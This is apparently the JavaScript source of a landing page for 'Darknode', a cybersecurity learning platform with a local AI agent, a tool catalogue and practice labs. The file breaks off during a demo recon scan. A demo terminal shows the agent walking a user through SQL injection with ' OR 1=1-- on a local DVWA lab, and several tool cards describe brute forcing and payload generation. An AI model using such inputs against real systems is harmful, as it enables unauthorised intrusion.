// Copyright (c) 2026 Darknode-Official. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
(function(){var _h=location.hostname,_a=["darknode.ai","www.darknode.ai","sentinel-b4194.web.app","sentinel-b4194-6173e.web.app","localhost","127.0.0.1"];if(!_a.some(function(d){return _h===d}))throw document.body.innerHTML="",new Error("unlicensed")}());

import { db } from "/js/firebase.js";
import { collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.17.0/firebase-firestore.js";

const GITHUB = "https://github.com/Darknode-Official";

export function renderLanding(view, actions) {
  view.innerHTML = `

    <!-- ====== HERO ====== -->
    <section class="hero" aria-label="Hero">
      <div class="hero-mesh"></div>
      <div class="hero-grain"></div>
      <div class="wrap hero-inner">
        <div class="hero-badge"><span class="badge-dot"></span> Source available &middot; Free forever</div>
        <h1 class="hero-h1">The AI-powered platform<br>for <span class="hero-rotate-wrap"><span class="hero-rotate" id="hero-rotate">cybersecurity</span></span></h1>
        <p class="hero-sub">Tools, labs, and an AI agent to learn cybersecurity — running entirely on your machine. No cloud. No subscriptions. No data leaves your computer.</p>
        <div class="hero-cta">
          <button class="btn lg" id="cta-start">Get started &mdash; free</button>
          <a class="btn lg ghost" href="${GITHUB}/darknode-cli" target="_blank" rel="noopener">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" style="margin-right:8px"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.3 3.44 9.8 8.2 11.39.6.11.82-.26.82-.58v-2.23c-3.34.73-4.04-1.42-4.04-1.42-.55-1.39-1.34-1.76-1.34-1.76-1.08-.74.08-.73.08-.73 1.2.08 1.84 1.23 1.84 1.23 1.07 1.83 2.81 1.3 3.5 1 .1-.78.42-1.3.76-1.6-2.67-.3-5.47-1.33-5.47-5.93 0-1.31.47-2.38 1.24-3.22-.14-.3-.54-1.52.1-3.18 0 0 1-.32 3.3 1.23a11.5 11.5 0 016.02 0c2.28-1.55 3.29-1.23 3.29-1.23.64 1.66.24 2.88.12 3.18.77.84 1.23 1.91 1.23 3.22 0 4.61-2.8 5.63-5.48 5.92.42.37.81 1.1.81 2.22v3.29c0 .32.22.7.82.58A12.01 12.01 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
            Star on GitHub
          </a>
        </div>
        <div class="hero-trust">
          <div class="trust-item"><span class="trust-n" data-count="600000" data-suffix="+" data-format="comma">0</span><span class="trust-l">Lines of code</span></div>
          <div class="trust-sep"></div>
          <div class="trust-item"><span class="trust-n" data-count="164" data-suffix="+">0</span><span class="trust-l">Security tools</span></div>
          <div class="trust-sep"></div>
          <div class="trust-item"><span class="trust-n" data-count="59">0</span><span class="trust-l">AI modules</span></div>
          <div class="trust-sep"></div>
          <div class="trust-item"><span class="trust-n" data-count="19">0</span><span class="trust-l">Sidebar groups</span></div>
          <div class="trust-sep"></div>
          <div class="trust-item"><span class="trust-n trust-n-static">100%</span><span class="trust-l">Local &amp; private</span></div>
        </div>
        <div class="hero-built-with">
          <span class="built-label">Built with</span>
          <div class="built-pills">
            <span class="built-pill">Node.js</span>
            <span class="built-pill">Python</span>
            <span class="built-pill">Ollama</span>
            <span class="built-pill">Claude</span>
            <span class="built-pill">Firebase</span>
            <span class="built-pill">Linux</span>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== PRODUCT BENTO ====== -->
    <section class="section" id="products" aria-labelledby="products-title">
      <div class="wrap">
        <div class="sec-label">Products</div>
        <h2 class="sec-title" id="products-title">Three ways to use Darknode</h2>
        <p class="sec-sub">Choose what fits. All free. All run on your machine.</p>
        <div class="bento">
          <div class="bento-card bento-lg">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M7 8h10M7 12h6M7 16h8"/></svg>
            </div>
            <h3>Web App</h3>
            <p>Open darknode.ai in your browser. Tools, cheat sheets, CVE lookup, practice labs, and the learning hub — zero install.</p>
            <span class="bento-tag">No install needed</span>
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            </div>
            <h3>CLI</h3>
            <p>One command: <code>npm i -g darknode-cli</code>. 164+ tools, AI agent, and the Nexus engine in your terminal.</p>
            <span class="bento-tag">npm install</span>
          </div>
          <div class="bento-card">
            <div class="bento-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M2 8h20"/><circle cx="5" cy="6" r=".5" fill="currentColor"/><circle cx="7.5" cy="6" r=".5" fill="currentColor"/></svg>
            </div>
            <h3>Linux VM</h3>
            <p>A full security workstation. Like Kali, but with Darknode and Nexus AI built in. Runs in VirtualBox or QEMU.</p>
            <span class="bento-tag">VirtualBox image</span>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== FEATURES ====== -->
    <section class="section alt" id="features" aria-labelledby="features-title">
      <div class="wrap">
        <div class="sec-label">Capabilities</div>
        <h2 class="sec-title" id="features-title">Everything you need to learn security</h2>
        <div class="feature-rows">
          <div class="feature-row">
            <div class="feature-text">
              <h3>164+ security tools, one command away</h3>
              <p>Nmap, Nuclei, Gobuster, Nikto, and more — pre-configured with copy-paste install commands. Search, filter, and launch from the web or CLI.</p>
            </div>
            <div class="feature-visual">
              <div class="term-window">
                <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode</span></div>
                <pre class="tw-body"><span class="c-pl">$</span> darknode scan 10.10.14.7\n<span class="c-ok">22</span>  ssh    OpenSSH 9.6\n<span class="c-ok">80</span>  http   nginx 1.24\n<span class="c-ok">443</span> https\n<span class="c-acc">[+]</span> 3 open ports</pre>
              </div>
            </div>
          </div>
          <div class="feature-row reverse">
            <div class="feature-text">
              <h3>AI that runs on your machine</h3>
              <p>Nexus is a 59-module AI agent engine. It reads your code, runs commands, explains vulnerabilities, and writes scripts. Use free local models or bring your own API key. We never see your data.</p>
            </div>
            <div class="feature-visual">
              <div class="term-window">
                <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">nexus</span></div>
                <pre class="tw-body"><span class="c-pl">$</span> darknode nexus "explain CVE-2021-44228"\n\n<span class="c-acc">Nexus:</span> Log4Shell is a critical RCE\nin Apache Log4j. It exploits\nJNDI lookup string injection...\n\n<span class="c-mut">engine: ollama (local, free)</span></pre>
              </div>
            </div>
          </div>
          <div class="feature-row">
            <div class="feature-text">
              <h3>Practice labs for hands-on learning</h3>
              <p>Launch DVWA, Juice Shop, WebGoat, and more with one click. They run locally in Docker — legal, safe, isolated. Test, learn, and reset in a safe environment.</p>
            </div>
            <div class="feature-visual">
              <div class="lab-grid">
                <div class="lab-card"><span class="lab-status on"></span>DVWA<span class="lab-port">:8080</span></div>
                <div class="lab-card"><span class="lab-status on"></span>Juice Shop<span class="lab-port">:3000</span></div>
                <div class="lab-card"><span class="lab-status off"></span>WebGoat<span class="lab-port">:8081</span></div>
                <div class="lab-card"><span class="lab-status off"></span>HackTheBox<span class="lab-port">:—</span></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- ====== HOW IT WORKS (4-step timeline) ====== -->
    <section class="section" id="how" aria-labelledby="how-title">
      <div class="wrap">
        <div class="sec-label">How it works</div>
        <h2 class="sec-title" id="how-title">Up and running in four steps</h2>
        <p class="sec-sub">From install to your first scan in under five minutes.</p>
        <div class="timeline-v">

          <div class="tlv-step">
            <div class="tlv-num">1</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Install in one command</h3>
                <p><code>npm i -g darknode-cli</code> or download the desktop app. Works on Linux, macOS, and Windows.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">terminal</span></div>
                  <pre class="tw-body"><span class="c-pl">$</span> npm i -g darknode-cli\n<span class="c-mut">+ darknode-cli@2.14.0</span>\n<span class="c-mut">added 1 package in 3.2s</span>\n\n<span class="c-pl">$</span> darknode --version\n<span class="c-ok">darknode v2.14.0</span></pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">2</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Launch Nexus AI</h3>
                <p>Run <code>darknode</code> in your terminal. The AI agent starts with GPT-OSS 120B -- free, private, no API key needed.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode</span></div>
                  <pre class="tw-body"><span class="c-pl">$</span> darknode\n\n  <span class="c-acc">Darknode Nexus v2.14</span>\n  Engine: <span class="c-ok">GPT-OSS 120B</span> (local)\n  Status: <span class="c-ok">Ready</span>\n\n<span class="c-acc">nexus&gt;</span> <span class="tw-cursor">_</span></pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">3</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Ask it anything</h3>
                <p>Describe what you want to do in plain English. Nexus reads your code, runs scans, writes scripts, and explains every step.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">nexus</span></div>
                  <pre class="tw-body"><span class="c-acc">nexus&gt;</span> scan 10.10.14.7 and explain\n        what you find\n\n<span class="c-acc">Nexus:</span> Running nmap on target...\n\n<span class="c-ok">22</span>  ssh    OpenSSH 9.6\n<span class="c-ok">80</span>  http   nginx 1.24\n<span class="c-ok">443</span> https\n\nPort 22: check <span class="c-bad">CVE-2024-6387</span>...</pre>
                </div>
              </div>
            </div>
          </div>

          <div class="tlv-step">
            <div class="tlv-num">4</div>
            <div class="tlv-body">
              <div class="tlv-text">
                <h3>Learn by doing</h3>
                <p>Practice on local labs, study the AI's methodology, and build real security skills. Everything runs on your machine.</p>
              </div>
              <div class="tlv-visual">
                <div class="term-window demo-term">
                  <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title">darknode</span></div>
                  <pre class="tw-body"><span class="c-pl">$</span> darknode lab start dvwa\n<span class="c-ok">[+]</span> DVWA running on localhost:8080\n\n<span class="c-acc">nexus&gt;</span> walk me through SQL injection\n\n<span class="c-acc">Nexus:</span> Open localhost:8080/login.\nTry entering <span class="c-bad">' OR 1=1--</span> in the\nusername field...</pre>
                </div>
              </div>
            </div>
          </div>

        </div>
      </div>
    </section>

    <!-- ====== TOOL SHOWCASE ====== -->
    <section class="section alt" id="tools-showcase" aria-labelledby="tools-title">
      <div class="wrap">
        <div class="sec-label">Toolkit</div>
        <h2 class="sec-title" id="tools-title">164+ purpose-built security tools</h2>
        <p class="sec-sub">Every tool built from scratch for Darknode. Not wrappers around other software — original security assessment and defense tooling.</p>
        <div class="ts-tabs" role="tablist" aria-label="Tool categories">
          <button class="ts-tab on" data-cat="all" role="tab" aria-selected="true">All</button>
          <button class="ts-tab" data-cat="recon" role="tab" aria-selected="false">Recon</button>
          <button class="ts-tab" data-cat="testing" role="tab" aria-selected="false">Testing</button>
          <button class="ts-tab" data-cat="defense" role="tab" aria-selected="false">Defense</button>
          <button class="ts-tab" data-cat="advanced" role="tab" aria-selected="false">Advanced</button>
          <button class="ts-tab" data-cat="analysis" role="tab" aria-selected="false">Analysis</button>
          <button class="ts-tab" data-cat="gov" role="tab" aria-selected="false">Government</button>
        </div>
        <div class="ts-grid" id="ts-grid">
          <div class="ts-card" data-cat="testing">
            <div class="ts-name">darknode-sandbox</div>
            <div class="ts-desc">Isolated threat sample analysis lab — disposable containers, filesystem + network monitoring, behavior reports, sample library</div>
            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="testing">
            <div class="ts-name">darknode-command</div>
            <div class="ts-desc">Security operations orchestration — multi-host coordination, encrypted channels, task automation, centralized management</div>
            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="recon">
            <div class="ts-name">darknode-recon</div>
            <div class="ts-desc">Full-scope reconnaissance — subdomain discovery, port scanning, service fingerprinting, tech stack detection, automated report generation</div>
            <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="defense">
            <div class="ts-name">darknode-forensics</div>
            <div class="ts-desc">Digital forensics evidence collection — disk imaging, memory dumps, timeline reconstruction, chain-of-custody logging</div>
            <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="testing">
            <div class="ts-name">darknode-auth-test</div>
            <div class="ts-desc">Authentication security testing — multi-protocol (SSH, FTP, HTTP, SMB, RDP), wordlist management, rate-aware testing</div>
            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="recon">
            <div class="ts-name">darknode-osint</div>
            <div class="ts-desc">Open-source intelligence gathering — email discovery, social media profiling, domain history, exposure detection</div>
            <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="advanced">
            <div class="ts-name">darknode-tunnel</div>
            <div class="ts-desc">Network tunneling and routing — SSH tunnels, SOCKS proxies, port forwarding chains, multi-hop connectivity</div>
            <div class="ts-meta"><span class="ts-badge cat-advanced">Advanced</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="defense">
            <div class="ts-name">darknode-incident</div>
            <div class="ts-desc">Incident response playbook runner — triage workflows, containment automation, evidence preservation, stakeholder notifications</div>
            <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="testing">
            <div class="ts-name">darknode-testgen</div>
            <div class="ts-desc">Security test script generation — proof-of-concept creation, multi-format output (EXE, ELF, PS1, Python), encoding variations</div>
            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="recon">
            <div class="ts-name">darknode-exposure</div>
            <div class="ts-desc">Full exposure mapping — asset discovery, exposed services, cloud enumeration, dependency analysis, risk scoring</div>
            <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="analysis">
            <div class="ts-name">darknode-re</div>
            <div class="ts-desc">Binary reverse engineering — disassembly, decompilation, string extraction, function analysis, binary analysis</div>
            <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="defense">
            <div class="ts-name">darknode-monitor</div>
            <div class="ts-desc">Real-time system monitoring — process tracking, network connections, file integrity, anomaly detection, alert triggers</div>
            <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="testing">
            <div class="ts-name">darknode-wireless</div>
            <div class="ts-desc">Wireless security assessment — network discovery, handshake analysis, WPA testing, rogue AP detection, Bluetooth scanning</div>
            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="advanced">
            <div class="ts-name">darknode-channels</div>
            <div class="ts-desc">Covert channel detection and analysis — DNS tunneling identification, ICMP analysis, steganography detection, encrypted transfer testing</div>
            <div class="ts-meta"><span class="ts-badge cat-advanced">Advanced</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="defense">
            <div class="ts-name">darknode-harden</div>
            <div class="ts-desc">Automated system hardening — CIS benchmark checks, firewall rules, service lockdown, permission auditing, compliance scoring</div>
            <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="recon">
            <div class="ts-name">darknode-intel</div>
            <div class="ts-desc">Threat intelligence aggregation — IOC feeds, APT tracking, CVE correlation, deep source monitoring, automated enrichment</div>
            <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="testing">
            <div class="ts-name">darknode-apifuzz</div>
            <div class="ts-desc">REST/GraphQL API fuzzer — endpoint discovery, parameter mutation, authorization testing, rate limit detection, schema extraction</div>
            <div class="ts-meta"><span class="ts-badge cat-testing">Testing</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="advanced">
            <div class="ts-name">darknode-directory</div>
            <div class="ts-desc">Active Directory security assessment — Kerberos analysis, delegation review, privilege auditing, enumeration mapping</div>
            <div class="ts-meta"><span class="ts-badge cat-advanced">Advanced</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="analysis">
            <div class="ts-name">darknode-report</div>
            <div class="ts-desc">Professional security assessment report generator — findings, evidence, risk ratings, remediation steps, executive summary, PDF/HTML output</div>
            <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="defense">
            <div class="ts-name">darknode-decoy</div>
            <div class="ts-desc">Honeypot network deployment — service emulation, canary tokens, activity logging, threat detection, alert escalation</div>
            <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="gov">
            <div class="ts-name">cyber-briefing</div>
            <div class="ts-desc">Executive cyber threat briefing generator — PDB-style reports, BLUF summaries, classification banners, decision support for national security leadership</div>
            <div class="ts-meta"><span class="ts-badge cat-gov">Government</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="gov">
            <div class="ts-name">vuln-triage</div>
            <div class="ts-desc">SSVC-based vulnerability triage engine — CISA KEV integration, BOD 22-01 compliance tracking, federal remediation SLA calculator, risk acceptance workflow</div>
            <div class="ts-meta"><span class="ts-badge cat-gov">Government</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="gov">
            <div class="ts-name">incident-cost</div>
            <div class="ts-desc">Cyber incident cost calculator — Ponemon methodology, sector-specific multipliers, regulatory fine estimator, insurance gap analysis, breach comparison database</div>
            <div class="ts-meta"><span class="ts-badge cat-gov">Government</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="gov">
            <div class="ts-name">fed-compliance</div>
            <div class="ts-desc">Federal compliance cross-walker — NIST 800-53, CSF 2.0, FedRAMP, CMMC 2.0, FISMA mapped side-by-side with gap analysis and POA&M generation</div>
            <div class="ts-meta"><span class="ts-badge cat-gov">Government</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="gov">
            <div class="ts-name">adversary-playbook</div>
            <div class="ts-desc">ATT&CK adversary emulation builder — drag-and-drop technique chaining, detection coverage heatmap, STIX 2.1 export, purple team exercise generation</div>
            <div class="ts-meta"><span class="ts-badge cat-gov">Government</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="analysis">
            <div class="ts-name">email-header-analyzer</div>
            <div class="ts-desc">Parse raw email headers to detect spoofing — SPF/DKIM/DMARC verification, hop-by-hop route tracing, suspicious indicator flagging, phishing detection</div>
            <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Medium</span></div>
          </div>
          <div class="ts-card" data-cat="analysis">
            <div class="ts-name">ioc-extractor</div>
            <div class="ts-desc">Extract indicators of compromise from unstructured text — IPs, domains, hashes, CVEs, URLs, emails with defang/refang, CSV/JSON/STIX 2.1 export</div>
            <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Medium</span></div>
          </div>
          <div class="ts-card" data-cat="defense">
            <div class="ts-name">threat-model-canvas</div>
            <div class="ts-desc">Interactive threat modeling with STRIDE methodology — component mapping, DREAD scoring, risk matrix visualization, mitigation tracking</div>
            <div class="ts-meta"><span class="ts-badge cat-defense">Defense</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="analysis">
            <div class="ts-name">log-forensics</div>
            <div class="ts-desc">Log analysis workbench — multi-format parser, timeline reconstruction, anomaly detection, pattern matching, IOC correlation, forensic report export</div>
            <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="recon">
            <div class="ts-name">recon-planner</div>
            <div class="ts-desc">Structured reconnaissance planning — target scoping, methodology selection, tool recommendations, phase tracking, findings aggregation</div>
            <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Medium</span></div>
          </div>
          <div class="ts-card" data-cat="recon">
            <div class="ts-name">subdomain-enum</div>
            <div class="ts-desc">Passive subdomain enumeration — domain discovery, IP resolution, status checking, tech stack detection, wordlist customization, multi-format export</div>
            <div class="ts-meta"><span class="ts-badge cat-recon">Recon</span><span class="ts-mode">Heavy</span></div>
          </div>
          <div class="ts-card" data-cat="analysis">
            <div class="ts-name">password-analyzer</div>
            <div class="ts-desc">Password strength analysis — entropy calculation, crack time estimation, pattern detection, policy compliance checking, secure password generation</div>
            <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Medium</span></div>
          </div>
          <div class="ts-card" data-cat="analysis">
            <div class="ts-name">cert-analyzer</div>
            <div class="ts-desc">X.509 certificate analysis — PEM parsing, chain visualization, expiry and weakness checks, SAN validation, field reference guide</div>
            <div class="ts-meta"><span class="ts-badge cat-analysis">Analysis</span><span class="ts-mode">Medium</span></div>
          </div>
        </div>
        <div style="text-align:center;margin-top:32px">
          <a class="btn lg ghost" href="/get-started" id="ts-view-all">View all 164+ tools &rarr;</a>
        </div>
      </div>
    </section>

    <!-- ====== NEXUS ENGINE ====== -->
    <section class="section nx-section" id="nexus" aria-labelledby="nexus-title">
      <div class="nx-section-glow"></div>
      <div class="wrap">
        <div class="sec-label">AI Engine</div>
        <h2 class="sec-title" id="nexus-title">Nexus &mdash; the engine under the hood</h2>
        <p class="sec-sub">Not a wrapper around ChatGPT. A full agentic platform with planning, multi-agent orchestration, self-evaluation, and 8 AI backends. Every layer built from scratch.</p>

        <!-- Architecture diagram -->
        <div class="nx-arch" aria-label="Nexus architecture diagram">
          <div class="nx-arch-layer nx-arch-l1">
            <div class="nx-arch-header">
              <span class="nx-arch-label">8 AI Engines</span>
              <span class="nx-arch-tag">Layer 1</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Claude</span>
              <span class="nx-arch-pill">Gemini</span>
              <span class="nx-arch-pill">Codex</span>
              <span class="nx-arch-pill">OpenCode</span>
              <span class="nx-arch-pill">Aider</span>
              <span class="nx-arch-pill">Ollama</span>
              <span class="nx-arch-pill">GPT-OSS</span>
              <span class="nx-arch-pill">API</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l2">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Planning &amp; Orchestration</span>
              <span class="nx-arch-tag">Layer 2</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Agentic Planner</span>
              <span class="nx-arch-pill">Multi-Agent</span>
              <span class="nx-arch-pill">Pipelines</span>
              <span class="nx-arch-pill">Skill Forge</span>
              <span class="nx-arch-pill">World Model</span>
              <span class="nx-arch-pill">Codemod</span>
              <span class="nx-arch-pill">Sandbox</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l3">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Memory &amp; Context</span>
              <span class="nx-arch-tag">Layer 3</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Deep Memory (3-tier)</span>
              <span class="nx-arch-pill">Sessions</span>
              <span class="nx-arch-pill">Context Engine</span>
              <span class="nx-arch-pill">Thought Stream</span>
              <span class="nx-arch-pill">Time Travel</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l4">
            <div class="nx-arch-header">
              <span class="nx-arch-label">Verification</span>
              <span class="nx-arch-tag">Layer 4</span>
            </div>
            <div class="nx-arch-pills">
              <span class="nx-arch-pill">Verification Engine</span>
              <span class="nx-arch-pill">Self-Evaluation</span>
              <span class="nx-arch-pill">Ghost Agents</span>
              <span class="nx-arch-pill">Code Review</span>
              <span class="nx-arch-pill">Code Radar</span>
              <span class="nx-arch-pill">Smart Tests</span>
              <span class="nx-arch-pill">Error Recovery</span>
            </div>
          </div>
          <div class="nx-arch-connector"></div>
          <div class="nx-arch-layer nx-arch-l5">
            <div class="nx-arch-footer-band">59 modules &mdash; 592,000+ lines of code</div>
          </div>
        </div>

        <!-- Feature highlights -->
        <div class="nx-highlights">
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3m0 12v3M3 12h3m12 0h3m-3.5-6.5L16 7m-8 10l-2.5 2.5M20.5 18.5L18 16M5.5 7L3.5 5.5"/><circle cx="12" cy="12" r="4"/></svg>
            </div>
            <h3>Multi-engine</h3>
            <p>Switch between 8 AI providers, race them against each other, or ensemble their answers for higher accuracy.</p>
          </div>
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0H5a2 2 0 01-2-2v-4m6 6h10a2 2 0 002-2v-4"/><path d="M14 9l-1 2 3 2-1 2"/></svg>
            </div>
            <h3>Autonomous</h3>
            <p>Give it a goal -- it plans, executes, and verifies with zero babysitting. Ghost Agents run tasks in the background.</p>
          </div>
          <div class="nx-hl">
            <div class="nx-hl-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/><circle cx="12" cy="16" r="1"/></svg>
            </div>
            <h3>Private</h3>
            <p>Runs 100% locally with Ollama. Your code never leaves your machine. No telemetry, no cloud, no data collection.</p>
          </div>
        </div>

        <!-- Collapsible module list -->
        <details class="nx-details">
          <summary>See all 59 modules &darr;</summary>
          <div class="nx-modules">
            <div class="nx-group">
              <h3>Intelligence</h3>
              <span>Intent Router</span><span>Reasoning Engine</span><span>Prompt Engine</span><span>Metacognition</span><span>Knowledge Graph</span><span>Workspace Intel</span><span>Adaptive Learner</span>
            </div>
            <div class="nx-group">
              <h3>Execution</h3>
              <span>Agentic Planner</span><span>Multi-Agent</span><span>Pipelines</span><span>Skill Forge</span><span>World Model</span><span>Codemod</span><span>Sandbox</span><span>NXP Protocol</span>
            </div>
            <div class="nx-group">
              <h3>Memory</h3>
              <span>Deep Memory (3-tier)</span><span>Sessions</span><span>Context Engine</span><span>Thought Stream</span><span>Time Travel</span>
            </div>
            <div class="nx-group">
              <h3>Quality</h3>
              <span>Verification Engine</span><span>Self-Evaluation</span><span>Ghost Agents</span><span>Code Review</span><span>Code Radar</span><span>Smart Tests</span><span>Error Recovery</span>
            </div>
            <div class="nx-group">
              <h3>Infrastructure</h3>
              <span>MCP Bridge</span><span>3D Modeler</span><span>Telemetry</span><span>Plugins</span><span>Git Intelligence</span><span>8 AI Engines</span>
            </div>
          </div>
        </details>
      </div>
    </section>

    <!-- ====== SEE IT IN ACTION ====== -->
    <section class="section alt" id="demo" aria-labelledby="demo-title">
      <div class="wrap">
        <div class="sec-label">See it in action</div>
        <h2 class="sec-title" id="demo-title">From recon to report in one workflow</h2>
        <p class="sec-sub">Four steps. One tool. Watch Darknode and Nexus AI take a target from unknown to fully documented.</p>
        <div class="showcase-tabs" role="tablist" aria-label="Demo tabs">
          <button class="showcase-tab active" role="tab" aria-selected="true" aria-controls="stab-recon" id="tab-recon" data-tab="recon">Recon scan</button>
          <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-analysis" id="tab-analysis" data-tab="analysis">AI analysis</button>
          <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-exploit" id="tab-exploit" data-tab="exploit">Security assessment</button>
          <button class="showcase-tab" role="tab" aria-selected="false" aria-controls="stab-report" id="tab-report" data-tab="report">Report generation</button>
        </div>
        <div class="showcase-window">
          <div class="term-window showcase-term">
            <div class="tw-bar"><span class="tw-dot r"></span><span class="tw-dot y"></span><span class="tw-dot g"></span><span class="tw-title" id="showcase-tw-title">darknode</span></div>
            <pre class="tw-body" id="showcase-body" aria-live="polite"><span class="showcase-panel" id="stab-recon" role="tabpanel" aria-labelledby="tab-recon"><span class="c-pl">$</span> darknode scan 10.10.14.7

<span class="c-mut">[*] Starting Darknode scan against 10.10.14.7</span>
<span class="c-mut">[*] Running service detection on all ports...</span>

<span class="c-ok">PORT    STATE  SERVICE       VERSION</span>
<span class="c-ok">22</span>      open   ssh           OpenSSH 8.9p1 Ubuntu
<span class="c-ok">80</span>      open   http          Apache httpd 2.4.52
<span class="c-ok">443</span>     open   https         Apache httpd 2.4.52
